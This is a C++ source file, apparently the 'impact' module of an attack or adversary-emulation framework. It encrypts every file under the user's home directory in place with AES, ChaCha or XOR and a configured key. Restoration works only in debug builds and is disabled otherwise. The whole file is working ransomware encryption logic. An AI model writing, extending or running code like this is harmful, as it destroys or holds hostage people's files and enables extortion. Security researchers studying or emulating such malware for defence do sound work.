#include "modules/impact/Encryption.hpp"
#include "modules/impact/EncryptionStrategies.hpp"
#include "utils/Logger.hpp"
#include "utils/CryptoUtils.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include "core/Config.hpp"

EncryptionMethod::EncryptionMethod() {
    #if defined(ALGO_AES)
        strategy = std::make_unique<AesEncryptionStrategy>();
        LOG_INFO("Encryption initialized with AES strategy")
    #elif defined(ALGO_CHACHA)
        strategy = std::make_unique<ChaChaEncryptionStrategy>();
        LOG_INFO("Encryption initialized with CHACHA strategy")
    #else
        strategy = std::make_unique<XorEncryptionStrategy>();
        LOG_INFO("Encryption initialized with XOR strategy")
    #endif
}

void EncryptionMethod::applyCrypto(bool encrypt) {
    std::string targetDir = SystemUtils::GetUserHome();
    std::string action = encrypt ? "Encrypting" : "Restoring";
    LOG_INFO("{} files in {}", action, targetDir)

    auto files = FileUtils::ListFilesRecursively(targetDir);
    int successCount = 0;

    for (const auto& filePath : files) {
        try {
            std::string content = FileUtils::ReadFile(filePath);
            if (content.empty()) continue;

            std::string processed = encrypt ? strategy->encrypt(content, Config::ENCRYPTION_KEY) : strategy->decrypt(content, Config::ENCRYPTION_KEY);

            if (!encrypt && processed.empty() && !content.empty()) {
                LOG_ERROR("Decryption resulted in empty content for {}", filePath);
                continue;
            }

            if (FileUtils::WriteFile(filePath, processed)) {
                LOG_INFO("{} {}", (encrypt ? "Encrypted" : "Decrypted"), filePath)
                successCount++;
            }
        } catch (const std::exception& e) {
            LOG_ERROR("Failed to encrypt {}", filePath, e.what())
        }
    }
    LOG_SUCCESS("Encryption summary: encrypted {} files", successCount)
}

bool EncryptionMethod::trigger() {
    applyCrypto(true);
    return true;
}

bool EncryptionMethod::restore() {
    #ifdef DEBUG_MODE
        applyCrypto(false);
        return true;
    #else
        LOG_ALERT("Restoration disabled in non-debug builds")
        return false;
    #endif
}
